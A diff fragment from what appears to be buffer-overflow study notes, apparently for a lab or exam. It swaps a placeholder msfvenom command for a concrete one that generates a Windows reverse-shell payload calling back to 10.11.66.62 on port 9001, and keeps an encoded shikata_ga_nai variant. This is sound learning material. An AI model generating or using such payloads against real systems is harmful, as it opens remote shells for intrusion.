@@ -158,7 +158,7 @@ e.g. \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit
 ## Generate payload
 
 ```console
-$ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<all bad chars>" -f c
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.66.62 LPORT=9001 EXITFUNC=thread -b "\x00" -f c
 
 With encoding
 $ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<all bad chars>" -f c x86/shikata_ga_nai
